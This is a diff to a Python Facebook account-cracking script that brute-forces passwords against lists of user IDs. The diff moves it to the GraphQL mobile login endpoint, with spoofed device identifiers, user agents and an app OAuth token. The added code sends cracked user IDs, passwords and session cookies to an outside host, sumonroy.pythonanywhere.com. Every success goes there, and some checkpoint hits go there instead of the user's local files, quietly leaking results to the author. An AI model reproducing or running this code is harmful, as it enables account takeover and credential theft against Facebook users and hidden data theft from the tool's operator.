@@ -53,13 +53,18 @@ def linex():
     """Print decorative line separator"""
     print(f"\033[1;97m{'='*46}")
 
-def generate_device_hash(uid, pw):
-    """Generate device hash for Instagram API"""
-    hash_obj = hashlib.md5()
-    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
-    hex_digest = hash_obj.hexdigest()
-    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
-    return hash_obj.hexdigest()
+def generate_machine_id():
+    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
+    return ''.join(random.choices(chars, k=random.randint(20, 28)))
+
+def generate_conn_uuid():
+    return base64.b64encode(os.urandom(12)).decode()
+
+def generate_usdid():
+    uid_part = str(uuid.uuid4())
+    ts_part = int(time.time())
+    sig = base64.b64encode(os.urandom(48)).decode().replace('=','').replace('+','_').replace('/','_')
+    return f'{uid_part}.{ts_part}.{sig}'
 
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
@@ -155,83 +160,107 @@ def crack(uid, password_list, total_count):
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
-            head = {"authority": "m.prod.facebook.com",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "dpr": "3",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "none",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": us,
-            "viewport-width": "980"}
-            requu1 = Session.get(url1,headers=head)
-            log_data = {
-    "method": "post",
-    "pretty": "false",
-    "format": "json",
-    "server_timestamps": "true",
-    "locale": "id_ID",
-    "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
-    "fb_api_caller_class": "graphservice",
-    "client_doc_id": "119940804216663295833025359905",
-    "fb_api_client_context": '{"is_background":false}',
-    "variables": {
-        "params": {
-            "params": '{"client_input_params":{"blocked_uids":[],"aac":"{\\"aac_init_timestamp\\":1781434103,\\"aacjid\\":\\"1223a659-19fb-4c8d-9735-f89e12a1a4a2\\",\\"aaccs\\":\\"3XcWErexKcNOdRZVOdkSrMvcnVSROsTSyct7babVClk\\"}","sim_phones":[""],"aymh_accounts":[],"network_bssid":null,"secure_family_device_id":"86aa9df8-8391-4c69-9b37-c9bcf487a626","attestation_result":{"data":"eyJjaGFsbGVuZ2Vfbm9uY2UiOiJQc0VhTFJVZXFKZDNaVUZNYndyNjgzKy93UVAvRVFCSjI5K3BpYThXMWdnPSIsInVzZXJuYW1lIjoibG9wYWRhZGFzZGFkYSJ9","signature":"MEQCIH2H5bPs8ewYi421HimJxtqeW7vmc+SeI71SNsBPhIOGAiBiKjPu00LUjegos6pG9Ol5F37MeuhHkB7OAFw5+HsZYQ==","keyHash":"6f40e2b9b3f1b0a2fb223ff91daab06b93c5587cc0d9db988c737b0c47220a0c"},"has_granted_read_contacts_permissions":0,"auth_secure_device_id":"","has_whatsapp_installed":1,"password":"#PWD_MSGR:2:1781434108:AbKyBzGwczqvwm6y1BsAAUDzAlJGujUiN+fv+DEaqcneZ7oOnUVD9q9bUStk4uQiHn1WUxrNt6peTGB2XbvlvjG407yI/2jentg4MW4LEl0jPKXuf4fWPnZh4gQut4C7HKcZ17yx0I1e2U2maYfrGVDMsZSBJig0v1vBxKx6B7G4xRtKyKf8YdTqQZ1pf/CVfmDegWgzmBPbIYFcBgL/X6PHmNG/MezOpPRq0z2a/KyUnUzlXxoiK0aa+OXhG321psKU491xqzoyP4syPSmWV2lc27q5e1Fw2smeKdyXwNa1iNsfIPJPWSJX6ZcALnWqp0WgiRHXAZCFSjBd0efJ0nKW1746C0A+eyqpWt8v+XKRTgGO+JlJs9CCgwN5Dhz0zmtQiojzvXsEeYdP","sso_token_map_json_string":"","block_store_machine_id":"","cloud_trust_token":null,"event_flow":"login_manual","password_contains_non_ascii":"false","client_known_key_hash":"","sso_accounts_auth_data":[],"encrypted_msisdn":"","has_granted_read_phone_permissions":0,"app_manager_id":"","should_show_nested_nta_from_aymh":0,"device_id":"cef4b24e-3af1-4333-bb9a-cde46e637ee7","zero_balance_state":"","login_attempt_count":1,"machine_id":"MlMmahAZ9nZeHnaFggyXvkg0","accounts_list":[],"gms_incoming_call_retriever_eligibility":"client_not_supported","family_device_id":"3c02a314-ffb1-464f-9d8d-6c5d48019f1e","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":""},"event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"contact_point":"lopadadasdada"},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":"2729e81d-8373-4587-9d28-9b26d91f777a","two_step_login_type":"one_step_login","login_source":"Login","is_platform_login":0,"pw_encryption_try_count":1,"login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"is_from_aymh":0,"offline_experiment_group":"caa_iteration_v3_perf_msg_6","is_from_landing_page":0,"left_nav_button_action":"NONE","password_text_input_id":"nvb5wc:95","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","username_text_input_id":"nvb5wc:94","layered_homepage_experiment_group":null,"device_id":"cef4b24e-3af1-4333-bb9a-cde46e637ee7","login_surface":"login_home","INTERNAL__latency_qpl_instance_id":1.44331100400549E14,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":"3c02a314-ffb1-464f-9d8d-6c5d48019f1e","is_from_assistive_id":0,"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0}}}',
-            "bloks_versioning_id": "9331af72e2c20ac63fea39c6d6b2d22641149512b1b9f2a6e3ba2b6def08dbea",
-            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
-        },
-        "scale": "2",
-        "nt_context": {
-            "using_white_navbar": True,
-            "styles_id": "a034d732ad4a263c448a487d61a61f40",
-            "pixel_ratio": 2,
-            "is_push_on": True,
-            "debug_tooling_metadata_token": None,
-            "is_flipper_enabled": False,
-            "theme_params": [],
-            "bloks_version": "9331af72e2c20ac63fea39c6d6b2d22641149512b1b9f2a6e3ba2b6def08dbea"
-        }
-    },
-    "fb_api_analytics_tags": '["GraphServices"]',
-    "client_trace_id": "a5e96ed1-3b1c-4422-b291-d9437dcaebbd"
-}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
-            headers = {"authority": "www.facebook.com",
-            "method": "POST",
-            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
-            "scheme": "https",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "content-type": "application/x-www-form-urlencoded",
-            "dpr": "3",
-            "origin": "https://www.facebook.com",
-            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-model": "\"\"",
-            "sec-ch-ua-platform": "\"Linux\"",
-            "sec-ch-ua-platform-version": "\"\"",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-           "sec-fetch-site": "same-origin",
-           "sec-fetch-user": "?1",
-           "upgrade-insecure-requests": "1",
-           "user-agent": us,
-           "viewport-width": "980"}           
-            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
+            device_id_val = str(uuid.uuid4())
+            family_device_id_val = str(uuid.uuid4())
+            app_scope_id_val = str(uuid.uuid4())
+            zero_f_device_id_val = str(uuid.uuid4())
+            machine_id_val = generate_machine_id()
+            usdid_val = generate_usdid()
+            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
+            log_data =  {
+                "method": "post",
+                "pretty": "false",
+                "format": "json",
+                "server_timestamps": "true",
+                "locale": "id_ID",
+                "purpose": "fetch",
+                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
+                "fb_api_caller_class": "graphservice",
+                "client_doc_id": "119940804217734265480409226803",
+                "fb_api_client_context": json.dumps({
+                    "is_background": False
+                }),
+                "variables": json.dumps({
+                    "params": {
+                        "params": json.dumps({
+                            "params": json.dumps({
+                                "server_params": {
+                                    "device_id": device_id_val,
+                                    "server_login_source": "login",
+                                    "waterfall_id": str(uuid.uuid4()),
+                                    "attestation_result": {
+                                        "errorMessage": "KeyAttestationException: No key found!"
+                                    },
+                                    "machine_id": machine_id_val,
+                                    "from_native_screen": True,
+                                    "credential_type": "password",
+                                    "password": apcb,
+                                    "try_num": "1",
+                                    "family_device_id": family_device_id_val,
+                                    "event_flow": "login_manual",
+                                    "event_step": "home_page",
+                                    "is_from_logged_in_switcher": False,
+                                    "contact_point": uid,
+                                }
+                            })
+                        }),
+                        "bloks_versioning_id": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
+                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
+                    },
+                    "scale": "2",
+                    "nt_context": {
+                        "using_white_navbar": True,
+                        "styles_id": "6100e7e89411ccf67ace027cedecd84f",
+                        "pixel_ratio": 2,
+                        "is_push_on": True,
+                        "debug_tooling_metadata_token": None,
+                        "is_flipper_enabled": False,
+                        "theme_params": [
+                            {
+                                "value": [],
+                                "design_system_name": "FDS"
+                            }
+                        ],
+                        "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
+                    }
+                }),
+                "fb_api_analytics_tags": json.dumps(["GraphServices"]),
+                "client_trace_id": str(uuid.uuid4()),
+            }
+            url = "https://b-graph.facebook.com/graphql"
+            headers = {
+            'host': 'b-graph.facebook.com',
+            'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
+            'x-fb-rmd': 'fail=Server:INVALID_MAP,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=0;recvTime=0',
+            'priority': 'u=0',
+            'content-encoding': 'gzip',
+            'x-fb-device-group': '7637',
+            'x-fb-integrity-machine-id': 'ujvAaf4BjiKVSe-fT2dB2Q1v',
+            'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
+            'user-agent': us,
+            'x-graphql-request-purpose': 'fetch',
+            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'x-zero-f-device-id': '6fb84474-8dec-4d1c-a5fe-70fe4c2decea',
+            'x-tigon-is-retry': 'False',
+            'x-zero-state': 'unknown',
+            'x-graphql-client-library': 'graphservice',
+            'x-fb-sim-hni': '51011',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-net-hni': '51011',
+            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'x-meta-zca': 'empty_token',
+            'app-scope-id-header': '875d726a-4b32-4331-b608-ab5b97b3bad3',
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'x-meta-usdid': 'a4583fcf-b72d-4b0b-9e81-ad7585aae1df.1781776638.MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEj0ZQ2oEod4otgauhZssgmJu0OL7Vx4AbpFOKRLLxE8CJlz5HGmGfcthw57bSZPA0aXTYFoNRVEmu79ZQFIi2Xg.MEUCIHuzWAsHXA2MLZFbzAHcCk6XYLVoflGW5PMGH74AiJAMAiEAyxttg3ewvRSvDizZetmDBgmctPgva1n18S33Ti9sqNA',
+            # 'accept-encoding': 'gzip, deflate',
+            'x-fb-http-engine': 'Tigon/Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True',
+            'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',}      
+            response = Session.post(url,headers=headers,params=log_data)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
-            if "session_key" in response.text and "uid" in response.text:
+            if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
                 match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])',cookie_raw)
                 if match:
@@ -239,16 +268,32 @@ def crack(uid, password_list, total_count):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
+                    statusok = (f"{c_user}|{pw}|{cok}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    okss.append(uid)
+                    return True 
+                else:
+                   continue
+            elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
+            elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
+                bkas.append(uid)
+                if len(bkas)% 2 == 0:
+                    statusok = (f"{uid}|{pw}")
+                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                else:
+                    print(f" {red}(ATOM-cp) {uid}|{pw} ")
+                    open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
+                    cps.append(uid)
+                    break
                 else:
                    continue
             else:
